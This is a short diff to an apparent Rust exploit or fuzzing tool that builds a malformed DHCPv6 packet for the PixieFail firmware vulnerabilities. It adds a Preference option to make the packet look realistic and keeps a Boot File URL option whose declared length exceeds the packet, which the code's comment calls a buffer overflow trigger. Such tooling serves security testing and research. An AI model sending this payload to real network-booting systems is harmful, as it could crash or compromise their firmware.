@@ -55,8 +55,18 @@ impl Payload for PixiefailDhcpPayload {
         data[opt2_offset + 10] = 0xC0;
         data[opt2_offset + 11] = 0x06;
 
+        // Option: Preference (option 7) — a recognized RFC 8415 option that
+        // keeps the packet structurally realistic (servers send it in
+        // Advertise messages).
+        let pref_offset = opt2_offset + 4 + 16;
+        data[pref_offset] = 0x00;
+        data[pref_offset + 1] = 7; // OPTION_PREFERENCE
+        data[pref_offset + 2] = 0x00;
+        data[pref_offset + 3] = 1; // length
+        data[pref_offset + 4] = 0xFF; // preference value
+
         // Option: Boot File URL (option 59) with oversized length
-        let opt3_offset = opt2_offset + 4 + 16;
+        let opt3_offset = pref_offset + 4 + 1;
         data[opt3_offset] = 0x00;
         data[opt3_offset + 1] = 59; // OPTION_BOOTFILE_URL
                                     // Declare length that exceeds packet (buffer overflow trigger)
